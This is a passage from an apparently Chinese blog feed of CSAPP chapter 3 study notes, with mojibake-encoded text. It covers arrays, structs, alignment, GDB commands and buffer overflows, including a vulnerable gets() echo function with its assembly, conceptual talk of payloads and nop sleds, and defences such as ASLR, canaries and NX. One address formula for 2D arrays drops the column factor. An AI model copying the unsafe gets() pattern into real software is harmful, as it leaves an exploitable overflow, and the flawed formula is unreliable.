è¢«è°ƒç”¨æ—¶å¯ä»¥éšæ„æ”¹å˜è¿™äº›å¯„å­˜å™¨ï¼Œé‚£ä¹ˆä¿å­˜å¥½è¿™äº›æ•°æ®å°±æ˜¯è°ƒç”¨è€… P çš„è´£ä»»ã€‚</p><h3 id="æ•°ç»„çš„åˆ†é…å’Œè®¿é—®"><a href="#æ•°ç»„çš„åˆ†é…å’Œè®¿é—®" class="headerlink" title="æ•°ç»„çš„åˆ†é…å’Œè®¿é—®"></a>æ•°ç»„çš„åˆ†é…å’Œè®¿é—®</h3><p>Cè¯­è¨€ä¸­çš„æ•°ç»„æ˜¯ä¸€ç§å°†æ ‡é‡æ•°æ®æ®ç»§æ‰¿æ›´å¤§æ•°æ®ç±»å‹çš„æ–¹å¼ã€‚</p><h4 id="åŸºæœ¬åŸåˆ™"><a href="#åŸºæœ¬åŸåˆ™" class="headerlink" title="åŸºæœ¬åŸåˆ™"></a>åŸºæœ¬åŸåˆ™</h4><p>å¯¹äºæ•°æ®ç±»å‹ T å’Œæ•´å‹å¸¸æ•° Nï¼Œæ•°ç»„å£°æ˜ä¸º <code>T A[N];</code> ï¼Œå®ƒçš„èµ·å§‹ä½ç½®æˆ‘ä»¬è¡¨ç¤ºä¸º <em>xA</em> ï¼Œæ•°ç»„å ç”¨çš„å­—èŠ‚æ•°æ˜¯ <em>sizeof(T)* N</em> ï¼Œæˆ‘ä»¬è®¿é—® A[i] ,å®é™…ä¸Šå°±æ˜¯è®¿é—® <em>xA + sizeof(T)* i</em>  ã€‚</p><h4 id="æŒ‡é’ˆè¿ç®—"><a href="#æŒ‡é’ˆè¿ç®—" class="headerlink" title="æŒ‡é’ˆè¿ç®—"></a>æŒ‡é’ˆè¿ç®—</h4><p>Cè¯­è¨€å…è®¸ä¸”å¯¹æŒ‡é’ˆè¿›è¡Œè¿ç®—ï¼Œè®¡ç®—å‡ºæ¥çš„å€¼ä¼šæ ¹æ®å¼•ç”¨è¯¥æŒ‡é’ˆçš„æ•°æ®ç±»å‹çš„å¤§å°è¿›è¡Œä¼¸ç¼©ã€‚ä¹Ÿå°±æ˜¯è¯´è¡¨è¾¾å¼ p+i  ç›¸å½“äº *xp+sizeof(type)<em>i</em> çš„åœ°å€ï¼ˆxp è¡¨ç¤ºæ•°ç»„ p çš„åŸºåœ°å€ï¼‰ã€‚</p><h4 id="åµŒå¥—çš„æ•°ç»„"><a href="#åµŒå¥—çš„æ•°ç»„" class="headerlink" title="åµŒå¥—çš„æ•°ç»„"></a>åµŒå¥—çš„æ•°ç»„</h4><p>æˆ‘ä»¬ä½¿ç”¨çš„äºŒç»´æ•°ç»„ï¼Œä¾‹å¦‚ <code>int A[5][3];</code>ï¼Œç­‰ä»·äº <code>typedef int row3_t[3]; row3_t A[5]</code>ï¼Œè¿™ç§å°±æ˜¯åµŒå¥—å£°æ˜ã€‚</p><p>æˆ‘ä»¬è¦è®¿é—®å¤šç»´æ•°ç»„ <code>T D[R][C]</code> çš„å…ƒç´  <em>D[i][j]</em>  ï¼Œå¯¹åº”çš„å†…å­˜åœ°å€æ˜¯ <em>xD+sizeof(T) *i+sizeof(T) *j</em>  ã€‚</p><h3 id="å¼‚è´¨çš„æ•°æ®ç»“æ„"><a href="#å¼‚è´¨çš„æ•°æ®ç»“æ„" class="headerlink" title="å¼‚è´¨çš„æ•°æ®ç»“æ„"></a>å¼‚è´¨çš„æ•°æ®ç»“æ„</h3><p>Cè¯­è¨€æä¾›äº†ä¸¤ç§å°†ä¸åŒç±»å‹å¯¹è±¡ç»“åˆåˆ°ä¸€èµ·åˆ›å»ºæ•°æ®ç±»å‹çš„æœºåˆ¶ï¼šç»“æ„å’Œè”åˆ</p><h4 id="ç»“æ„ï¼ˆstruct"><a href="#ç»“æ„ï¼ˆstruct" class="headerlink" title="ç»“æ„ï¼ˆstruct)"></a>ç»“æ„ï¼ˆstruct)</h4><p><code>struct</code> ä¹Ÿå«ç»“æ„ä½“ï¼Œå°†å¯èƒ½ä¸åŒç±»å‹çš„åŸºæœ¬æ•°æ®èšå’Œåˆ°ä¸€ä¸ªå¯¹è±¡å½“ä¸­ï¼Œç”¨åå­—æ¥å¼•ç”¨ç»“æ„çš„å„ä¸ªéƒ¨åˆ†ã€‚ç¼–è¯‘å™¨ç»´æŠ¤å…³äºæ¯ä¸ªç»“æ„ç±»å‹çš„ä¿¡æ¯ï¼ŒæŒ‡ç¤ºæ¯ä¸ªå­—æ®µçš„å­—èŠ‚åç§»ï¼Œä½œä¸ºå†…å­˜å¼•ç”¨æŒ‡ä»¤ä¸­çš„ä½ç§»ï¼Œç”¨æ¥å®ç°å„ä¸ªå…ƒç´ çš„å¼•ç”¨ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬æƒ³è¦è®¿é—®ç»“æ„ä½“ä¸­çš„æŸä¸ªå¯¹è±¡ï¼Œåªéœ€è¦å°†ç»“æ„ä½“çš„åœ°å€å†åŠ ä¸Šè¿™ä¸ªå­—æ®µçš„åç§»å³å¯ã€‚</p><h4 id="è”åˆï¼ˆunion"><a href="#è”åˆï¼ˆunion" class="headerlink" title="è”åˆï¼ˆunion)"></a>è”åˆï¼ˆunion)</h4><p>è”åˆçš„å£°æ˜æ–¹å¼å’Œç»“æ„ä½“ç›¸åŒï¼Œä½†ä¸åŒçš„æ˜¯è”åˆå†…çš„<strong>æ‰€æœ‰æˆå‘˜å˜é‡å…±äº«åŒä¸€å—å†…å­˜</strong>ï¼Œåªèƒ½åŒæ—¶è®¿é—®ä¸€ä¸ªæ•°æ®æˆå‘˜ï¼Œè€Œç»“æ„ä½“ä¸­çš„æ•°æ®æˆå‘˜å„è‡ªç‹¬ç«‹çš„å ç”¨å†…å­˜ï¼Œæ‰€ä»¥å¯ä»¥è¢«åŒæ—¶è®¿é—®ã€‚</p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">U</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> c;<br>    <span class="hljs-type">int</span> i[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">double</span> v;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹äº Uçš„æŒ‡é’ˆ <code>p</code> ï¼Œ<code>p-&gt;c</code> å’Œ<code>p-&gt;i[0]</code>éƒ½æ˜¯æŒ‡å‘ U çš„èµ·å§‹ä½ç½®ã€‚</p><h4 id="æ•°æ®å¯¹é½"><a href="#æ•°æ®å¯¹é½" class="headerlink" title="æ•°æ®å¯¹é½"></a>æ•°æ®å¯¹é½</h4><p>è®¸å¤šè®¡ç®—ç³»ç»Ÿéƒ½å¯¹æ•°æ®ç±»å‹çš„åˆæ³•åœ°å€åšå‡ºäº†ä¸€äº›é™åˆ¶ï¼Œè¦æ±‚æŸäº›æ•°æ®å¯¹è±¡çš„åœ°å€å¿…é¡»æ˜¯æŸä¸ªå€¼çš„å€æ•°ã€‚ä¾‹å¦‚å¤„ç†å™¨æ€»æ˜¯ä»å†…å­˜ä¸­å– 8 å­—èŠ‚ï¼Œé‚£ä¹ˆæœ‰æ•ˆåœ°å€å°±å¿…é¡»æ˜¯ 8 å­—èŠ‚çš„å€æ•°ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥ä¿è¯ç”¨ä¸€ä¸ªå†…å­˜æ“ä½œæ¥è¯»ã€å†™å€¼äº†ã€‚</p><p>ä¾‹å¦‚ä¸‹é¢çš„ç»“æ„ä½“ï¼Œå¦‚æœæ²¡æœ‰å¯¹é½è¦æ±‚ï¼Œæˆ‘ä»¬è®¤ä¸ºä»–ä»¬çš„å†…å­˜å ç”¨æƒ…å†µå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">S</span>&#123;</span><br>    <span class="hljs-type">int</span> i;         <span class="hljs-comment">//+4</span><br>    <span class="hljs-type">char</span> c;        <span class="hljs-comment">//4+=1</span><br>    <span class="hljs-type">int</span> j;        <span class="hljs-comment">//5+=4</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†å®é™…ä¸Šæ˜¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">S</span>&#123;</span><br>    <span class="hljs-type">int</span> i;         <span class="hljs-comment">//+4</span><br>    <span class="hljs-type">char</span> c;        <span class="hljs-comment">//4+=1</span><br>    <span class="hljs-type">int</span> j;        <span class="hljs-comment">//8+=4</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ç”»å‡ºå›¾å°±æ˜¯ä¸‹é¢çš„æ ·å­ï¼Œç°è‰²éƒ¨åˆ†æ˜¯ä¸ºäº†å¯¹å†…å¯¹é½å¯¼è‡´çš„ä¸¤ä¸ªæ•°æ®æˆå‘˜ä¹‹é—´çš„ç©ºçš„é—´éš™</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/3-%E5%86%85%E5%AD%98%E5%AF%B9%E9%BD%90.png"></p><p>å› ä¸ºä¸åŒçš„æ•°æ®ç±»å‹éƒ½å¿…é¡»å¯¹å…¶ç›¸åº”çš„å€¼Kï¼Œå…·ä½“å¦‚ä¸‹è¡¨ï¼š</p><table><thead><tr><th>K</th><th>ç±»å‹</th></tr></thead><tbody><tr><td>1</td><td>char</td></tr><tr><td>2</td><td>short</td></tr><tr><td>4</td><td>int , float</td></tr><tr><td>8</td><td>long , double , char*</td></tr></tbody></table><h3 id="åœ¨æœºå™¨çº§ç¨‹åºä¸­å°†æ§åˆ¶ä¸æ•°æ®ç»“åˆèµ·æ¥"><a href="#åœ¨æœºå™¨çº§ç¨‹åºä¸­å°†æ§åˆ¶ä¸æ•°æ®ç»“åˆèµ·æ¥" class="headerlink" title="åœ¨æœºå™¨çº§ç¨‹åºä¸­å°†æ§åˆ¶ä¸æ•°æ®ç»“åˆèµ·æ¥"></a>åœ¨æœºå™¨çº§ç¨‹åºä¸­å°†æ§åˆ¶ä¸æ•°æ®ç»“åˆèµ·æ¥</h3><h4 id="æŒ‡é’ˆ"><a href="#æŒ‡é’ˆ" class="headerlink" title="æŒ‡é’ˆ"></a>æŒ‡é’ˆ</h4><p><del>æŒ‡é’ˆæˆ‘ä¸€ç”Ÿä¹‹æ•Œï¼</del></p><p>æŒ‡é’ˆæ˜¯Cè¯­è¨€çš„ç‰¹è‰²ï¼Œå®ƒä»¬å…è®¸ç¨‹åºç›´æ¥è®¿é—®è®¡ç®—æœºå†…å­˜ä¸­çš„æ•°æ®ã€‚æ¯ä¸ªæŒ‡é’ˆéƒ½å¯¹åº”ä¸€ä¸ªç±»å‹ï¼Œè¡¨ç¤ºäº†å®ƒæŒ‡å‘çš„å†…å­˜ä¸ºä»€ä¹ˆæ•°æ®ç±»å‹ã€‚</p><p>ä»¥ä¸‹æ˜¯æŒ‡é’ˆçš„ç‰¹ç‚¹ï¼š</p><ul><li><code>*</code> æ“ä½œç¬¦æ˜¯é—´æ¥å¼•ç”¨æŒ‡é’ˆï¼Œç»“æœæ•°æ®æ˜¯è¯¥æŒ‡é’ˆçš„ç±»å‹</li><li>æ¯ä¸ªæŒ‡é’ˆéƒ½æœ‰ä¸€ä¸ªå€¼ï¼Œè¿™ä¸ªå€¼å°±æ˜¯æŸä¸ªæŒ‡å®šç±»å‹å¯¹è±¡çš„åœ°å€ï¼ŒNULL(0) ä¹Ÿæ˜¯ä¸€ä¸ªå€¼ï¼Œè¡¨ç¤ºæŒ‡é’ˆå¹¶æ²¡æœ‰æŒ‡å‘ä»»ä½•åœ°æ–¹</li><li>å¯¹æŒ‡é’ˆè¿›è¡Œå¼ºåˆ¶ç±»å‹è½¬æ¢å€¼ï¼Œæ”¹å˜å®ƒçš„ç±»å‹ï¼Œä¸æ”¹å˜å®ƒçš„å€¼</li><li>æŒ‡é’ˆå¯ä»¥æŒ‡å‘å‡½æ•°</li></ul><p>æˆ‘ä»¬è¿™æ ·æ¥å£°æ˜ä¸€ä¸ªæŒ‡é’ˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C">type *name ;   <br>type (*name) (arglist) ;  <span class="hljs-comment">//æŒ‡å‘å‡½æ•°ï¼Œæ‹¬å·å¿…é¡»å°†*å’Œå‡½æ•°åæ‹¬åœ¨ä¸€èµ·</span><br></code></pre></td></tr></table></figure><h4 id="GDBè°ƒè¯•å™¨"><a href="#GDBè°ƒè¯•å™¨" class="headerlink" title="GDBè°ƒè¯•å™¨"></a>GDBè°ƒè¯•å™¨</h4><p>GNU è°ƒè¯•å™¨ GDB æä¾›äº†è®¸å¤šæœ‰ç”¨çš„ç‰¹æ€§ï¼Œæ”¯æŒæœºå™¨çº§ç¨‹åºè¿è¡Œæ—¶çš„åˆ†æã€‚æˆ‘ä»¬å¯ä»¥ç”¨ä¸‹é¢çš„æŒ‡ä»¤å¯åŠ¨GDBå¹¶è°ƒè¯•ç¨‹åº</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">linux&gt; </span><span class="language-bash">gdb filename</span><br></code></pre></td></tr></table></figure><p>è¾“å…¥ help(h) å°±å¯ä»¥æŸ¥çœ‹å…·ä½“çš„å‘½ä»¤ï¼Œå¸¸ç”¨çš„å‘½ä»¤å¦‚ä¸‹ï¼š</p><table><thead><tr><th>è°ƒè¯•å‘½ä»¤ (ç¼©å†™)</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>break (b)  xxx</td><td>åœ¨æºä»£ç æŒ‡å®šçš„æŸä¸€è¡Œè®¾ç½®æ–­ç‚¹ï¼Œå…¶ä¸­ xxx ç”¨äºæŒ‡å®šå…·ä½“æ‰“æ–­ç‚¹ä½ç½®</td></tr><tr><td>run (rï¼‰</td><td>æ‰§è¡Œè¢«è°ƒè¯•çš„ç¨‹åºï¼Œå…¶ä¼šè‡ªåŠ¨åœ¨ç¬¬ä¸€ä¸ªæ–­ç‚¹å¤„æš‚åœæ‰§è¡Œ</td></tr><tr><td>continue (cï¼‰</td><td>å½“ç¨‹åºåœ¨æŸä¸€æ–­ç‚¹å¤„åœæ­¢åï¼Œç”¨è¯¥æŒ‡ä»¤å¯ä»¥ç»§ç»­æ‰§è¡Œï¼Œç›´è‡³é‡åˆ°æ–­ç‚¹æˆ–è€…ç¨‹åºç»“æŸ</td></tr><tr><td>next (n)</td><td>ä»¤ç¨‹åºä¸€è¡Œä»£ç ä¸€è¡Œä»£ç çš„æ‰§è¡Œ</td></tr><tr><td>stepï¼ˆsï¼‰</td><td>å¦‚æœæœ‰è°ƒç”¨å‡½æ•°ï¼Œè¿›å…¥è°ƒç”¨çš„å‡½æ•°å†…éƒ¨ï¼›å¦åˆ™ï¼Œå’Œ next å‘½ä»¤çš„åŠŸèƒ½ä¸€æ ·</td></tr><tr><td>until (u)</td><td>å½“ä½ åŒå€¦äº†åœ¨ä¸€ä¸ªå¾ªç¯ä½“å†…å•æ­¥è·Ÿè¸ªæ—¶ï¼Œå•çº¯ä½¿ç”¨ until å‘½ä»¤ï¼Œå¯ä»¥è¿è¡Œç¨‹åºç›´åˆ°é€€å‡ºå¾ªç¯ä½“</td></tr><tr><td>until n</td><td>å‘½ä»¤ä¸­ï¼Œn ä¸ºæŸä¸€è¡Œä»£ç çš„è¡Œå·ï¼Œè¯¥å‘½ä»¤ä¼šä½¿ç¨‹åºè¿è¡Œè‡³ç¬¬ n è¡Œä»£ç å¤„åœæ­¢</td></tr><tr><td>print (pï¼‰xxx</td><td>æ‰“å°æŒ‡å®šå˜é‡çš„å€¼ï¼Œå…¶ä¸­ xxx æŒ‡çš„å°±æ˜¯æŸä¸€å˜é‡å</td></tr><tr><td>list (l)</td><td>æ˜¾ç¤ºæºç¨‹åºä»£ç çš„å†…å®¹ï¼ŒåŒ…æ‹¬å„è¡Œä»£ç æ‰€åœ¨çš„è¡Œå·</td></tr><tr><td>finishï¼ˆfiï¼‰</td><td>ç»“æŸå½“å‰æ­£åœ¨æ‰§è¡Œçš„å‡½æ•°ï¼Œå¹¶åœ¨è·³å‡ºå‡½æ•°åæš‚åœç¨‹åºçš„æ‰§è¡Œ</td></tr><tr><td>returnï¼ˆreturnï¼‰</td><td>ç»“æŸå½“å‰è°ƒç”¨å‡½æ•°å¹¶è¿”å›æŒ‡å®šå€¼ï¼Œåˆ°ä¸Šä¸€å±‚å‡½æ•°è°ƒç”¨å¤„åœæ­¢ç¨‹åºæ‰§è¡Œ</td></tr><tr><td>jumpï¼ˆj)</td><td>ä½¿ç¨‹åºä»å½“å‰è¦æ‰§è¡Œçš„ä»£ç å¤„ï¼Œç›´æ¥è·³è½¬åˆ°æŒ‡å®šä½ç½®å¤„ç»§ç»­æ‰§è¡Œåç»­çš„ä»£ç </td></tr><tr><td>quit (q)</td><td>ç»ˆæ­¢è°ƒè¯•ï¼Œé€€å‡º GDB shell</td></tr><tr><td>kill (k)</td><td>æ€æ­»ç¨‹åºï¼Œå¼ºåˆ¶ç»ˆæ­¢æ­£åœ¨è¢«è°ƒè¯•çš„å¼‚å¸¸ç¨‹åº</td></tr></tbody></table><h4 id="å†…å­˜è¶Šç•Œå¼•ç”¨å’Œç¼“å†²åŒºæº¢å‡º"><a href="#å†…å­˜è¶Šç•Œå¼•ç”¨å’Œç¼“å†²åŒºæº¢å‡º" class="headerlink" title="å†…å­˜è¶Šç•Œå¼•ç”¨å’Œç¼“å†²åŒºæº¢å‡º"></a>å†…å­˜è¶Šç•Œå¼•ç”¨å’Œç¼“å†²åŒºæº¢å‡º</h4><p>Cåœ¨æ•°ç»„å¼•ç”¨çš„æ—¶ä¸ä¼šè¿›è¡Œä»»ä½•è¾¹ç•Œæ£€æŸ¥ï¼Œè€Œä¸”å±€éƒ¨å˜é‡å’ŒçŠ¶æ€ä¿¡æ¯éƒ½å­˜æ”¾åœ¨æ ˆä¸­ï¼Œä¸¤è€…ç»“åˆèµ·æ¥å°±ä¼šå¯¼è‡´ä¸¥é‡çš„ç¨‹åºé”™è¯¯ï¼Œç ´åæ ˆä¸­å­˜å‚¨çš„ä¿¡æ¯ï¼Œå¦‚æœä¿æŒè¿™ä¸ªè¢«ç ´åçš„ä¿¡æ¯å¹¶è¯•å›¾é‡æ–°åŠ è½½å¯„å­˜å™¨æˆ–è€…å°è¯•æ‰§è¡Œ ret ï¼Œå°±ä¼šå¯¼è‡´ç¨‹åºå‘ç”Ÿé”™è¯¯ã€‚</p><p>ä¸€ç§å¸¸è§çš„çŠ¶æ€ç ´åè¢«ç§°ä¸º<strong>ç¼“å†²åŒºæº¢å‡º</strong>ï¼Œé€šå¸¸å‘ç”Ÿå­å•Šåœ¨æˆ‘ä»¬åœ¨æ ˆä¸­åˆ†é…å­—ç¬¦æ•°ç»„çš„æ—¶å€™ï¼Œè¾“å…¥çš„å­—ç¬¦ä¸²çš„é•¿åº¦è¶…å‡ºäº†ä¸ºå®ƒåˆ†é…çš„ç©ºé—´å¤§å°ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">echo</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>];<br>    gets(buf);    <span class="hljs-comment">//getsä¸ä¼šå¯¹è¾“å…¥æ•°æ®çš„é•¿åº¦è¿›è¡Œåˆ¤æ–­ï¼Œåªæœ‰é‡åˆ°&quot;\n&quot;æ‰ä¼šåœæ­¢è¯»å–</span><br>    <span class="hljs-built_in">puts</span>(buf);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹åº”çš„æ±‡ç¼–ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pushq    %rbp<br>movq    %rsp, %rbp<br>subq    $16, %rsp<br>leaq    -8(%rbp), %rax<br>movq    %rax, %rdi<br>movl    $0, %eax<br>call    gets@PLT<br>leaq    -8(%rbp), %rax<br>movq    %rax, %rdi<br>call    puts@PLT<br>nop<br>leave<br>ret<br></code></pre></td></tr></table></figure><p>å…¶ä¸­æœ‰æŒ‡ä»¤ <code>leaq -8(%rbp), %rax</code> çš„æ„æ€å°±æ˜¯å°†ç›¸å¯¹äºåŸºæŒ‡é’ˆ <code>rbp</code> çš„åœ°å€åç§» <code>-8</code>åŠ è½½åˆ°å¯„å­˜å™¨ <code>rax</code> ä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€æ—¦è¾“å…¥è¶…è¿‡äº† 8 å­—èŠ‚ï¼Œå°±ä¼šè¦†ç›– <code>rbp</code> æ‰€åœ¨çš„ä½ç½®ï¼Œå†é•¿ 8 å­—èŠ‚å°±ä¼šè¦†ç›–ä½è¿”å›åœ°å€ã€‚</p><p>ç¼“å†²åŒºæº¢å‡ºçš„è‡´å‘½ä½¿ç”¨å°±æ˜¯è®©ç¨‹åºæ‰§è¡Œæœ¬æ¥ä¸è¯¥æ‰§è¡Œçš„å‡½æ•°ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ç§æœ€å¸¸è§çš„ç½‘ç»œæ”»å‡»çš„æ–¹æ³•ã€‚æˆ‘ä»¬ç§°ç¼–å†™çš„æ”»å‡»ä»£ç ä¸º exploit code ï¼Œç›´æ¥è¾“å…¥çš„å­—èŠ‚è¢«ç§°ä¸º payloadã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæ”»å‡»ä»£ç å¯èƒ½ä¼šå°è¯•å¯åŠ¨ä¸€ä¸ª shell ç¨‹åºï¼Œè¿™æ ·æ”»å‡»è€…å°±å¯ä»¥è·å–å¯¹å—å®³è®¡ç®—æœºç›´æ¥æ“æ§çš„æƒé™ã€‚</p><h4 id="å¯¹æŠ—ç¼“å†²åŒºæº¢å‡ºæ”»å‡»"><a href="#å¯¹æŠ—ç¼“å†²åŒºæº¢å‡ºæ”»å‡»" class="headerlink" title="å¯¹æŠ—ç¼“å†²åŒºæº¢å‡ºæ”»å‡»"></a>å¯¹æŠ—ç¼“å†²åŒºæº¢å‡ºæ”»å‡»</h4><p>GCC æä¾›äº†ä¸€äº›æœºåˆ¶æ¥é˜²æ­¢æ”»å‡»è€…åˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºæ¥è·å–ç³»ç»Ÿæ§åˆ¶æƒé™ï¼Œå¦‚ä¸‹ï¼š</p><ul><li><p>æ ˆéšæœºåŒ–</p><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œç¨‹åºæ¯æ¬¡è¿è¡Œçš„è™šæ‹Ÿåœ°å€éƒ½æ˜¯å›ºå®šä¸å˜çš„ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥å°†æƒ³è¦æ‰§è¡Œçš„å‡½æ•°åœ°å€è¦†ç›–åœ¨è¿”å›åœ°å€ä¸Šã€‚</p><p>æ ˆéšæœºçš„æ€æƒ³ä½¿å¾—æ¯æ¬¡ç¨‹åºè¿è¡Œæ—¶æ ˆçš„ä½ç½®éƒ½æœ‰å˜åŒ–ï¼Œè¿™ç±»æŠ€æœ¯æˆ‘ä»¬æˆä¸º <strong>åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼ˆAddress-Space Layout Randomizationï¼ŒASLRï¼‰</strong>ã€‚åŸç†æ˜¯æ¯æ¬¡è¿è¡Œç¨‹åºæ—¶ï¼Œç¨‹åºçš„ä¸åŒéƒ¨åˆ†åŒ…æ‹¬ç¨‹åºä»£ç ã€åº“ä»£ç å’Œå…¨å±€å˜é‡ç­‰æ•°æ®éƒ½ä¼šè¢«åŠ è½½åˆ°å†…å­˜çš„ä¸åŒåŒºåŸŸã€‚</p><p>å½“ç„¶æ”»å‡»è€…ä¹Ÿæœ‰å¯¹æŠ—ä¿æŠ¤çš„æ–¹æ³•ï¼Œå°±æ˜¯åœ¨å®é™…çš„çš„æ”»å‡»ä»£ç å‰é¢æ’å…¥å¾ˆå¤š nop æŒ‡ä»¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦ä»»æ„å‘½ä¸­ä¸€ä¸ª nop éƒ½å¯ä»¥å¯¼è‡´æˆ‘ä»¬æ¶æ„ä»£ç çš„é¡ºåˆ©æ‰§è¡Œã€‚è¿™ä¸ªåºåˆ—å¸¸ç”¨çš„æœ¯è¯­ â€œnop sledâ€ å°±æ˜¯â€æ»‘â€œè¿‡åºåˆ—çš„æ„æ€ã€‚</p></li><li><p>æ ˆç ´åæ£€æµ‹</p><p>æ ˆç ´åæ£€æµ‹æ˜¯åœ¨æ ˆå·²ç»è¢«ç ´ååè¿›è¡Œçš„é˜²å¾¡æªæ–½ï¼ŒGCC ä¸­å¯¹åº”çš„æœºåˆ¶å«åšæ ˆä¿æŠ¤è€…ï¼ˆstack-protectorï¼‰ã€‚å…¶æ€æƒ³æ˜¯åœ¨ç¼“å†²åŒºå’Œè¿”å›åœ°å€ä¹‹å‰æ’å…¥ä¸€æ®µéšæœºæ•°ï¼Œåœ¨å‡½æ•°è¿”å›ä¹‹å‰æ£€æŸ¥è¿™ä¸ªéšæœºæ•°æ˜¯å¦è¢«æ›´æ”¹ï¼Œå¦‚æœè¢«æ›´æ”¹å°±ç»ˆæ­¢ç¨‹åºã€‚è¿™ä¸ªéšæœºæ•°å«åšé‡‘ä¸é›€ï¼ˆcanaryï¼‰å€¼ã€‚</p></li><li><p>æ ˆä¸å¯æ‰§è¡Œ</p><p>è¿™ä¸ªä¿æŠ¤æªæ–½ç›´æ¥é™åˆ¶äº†æ”»å‡»è€…åƒç³»ç»Ÿä¸­æ’å…¥å¯æ‰§è¡Œä»£ç çš„è¡Œä¸ºï¼Œä¹Ÿå°±æ˜¯ NXï¼ˆNo-Executeï¼‰ï¼Œé€šè¿‡è¿™ä¸ªç‰¹æ€§æˆ‘ä»¬å¯ä»¥å°†æ ˆè®¾ç½®ä¸ºä¸å¯æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯å‘æ ˆä¸Šæ’å…¥çš„ä»£ç æ˜¯ä¸ä¼šè¿è¡Œçš„ã€‚</p></li></ul><h3 id="æµ®ç‚¹æ•°"><a href="#æµ®ç‚¹æ•°" class="headerlink" title="æµ®ç‚¹æ•°"></a>æµ®ç‚¹æ•°</h3><p><del>ä¹¦ä¸Šè¿˜æœ‰ä¸€å°èŠ‚æµ®ç‚¹æ•°çš„éƒ¨åˆ†</del></p><p>å½“å‰ä½¿ç”¨çš„ AVX æŒ‡ä»¤é›†ä¸­ï¼Œæµ®ç‚¹æ•°çš„æœºå™¨ä»£ç é£æ ¼å’Œæ•´æ•°æ•°æ®çš„å„ç§æ“ä½œç±»ä¼¼ï¼Œä¸åŒå°±åœ¨äºå¯„å­˜å™¨å’ŒæŒ‡ä»¤çš„è¡¨ç¤ºï¼Œæµ®ç‚¹æ•°é€šå¸¸æœ‰ä¸“ç”¨çš„æµ®ç‚¹å¯„å­˜å™¨å’Œæµ®ç‚¹æŒ‡ä»¤ã€‚</p><blockquote><p>AVX æŒ‡ä»¤é›†æ˜¯è‹±ç‰¹å°”ï¼ˆIntelï¼‰å’ŒAMDï¼ˆAdvanced Micro Devicesï¼‰å¤„ç†å™¨æ¶æ„ä¸­çš„ä¸€ç§ SIMDï¼ˆSingle Instruction, Multiple Dataï¼Œå•æŒ‡ä»¤å¤šæ•°æ®ï¼‰æ‰©å±•æŒ‡ä»¤é›†</p></blockquote><hr><p>æˆ‘è¦å¼€å§‹å¿«ä¹å›½åº†èŠ‚å™œï¼ï¼</p><p>èº«ä¸Šé¢“åºŸçš„ä¸Šå­¦å‘³å·²ç»æ¶ˆæ•£ï¼Œç°åœ¨æˆ‘æµ‘èº«éƒ½æ•£å‘ç€æµ“éƒçš„çˆ±å›½æ°”æ¯ğŸ¥³</p>]]></content>
    
    
    <categories>
      
      <category>è¯»ä¹¦ç¬”è®°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP ç¬¬äºŒç«  datalab</title>
    <link href="/2023/09/19/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-datalab/"/>
    <url>/2023/09/19/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-datalab/</url>
    
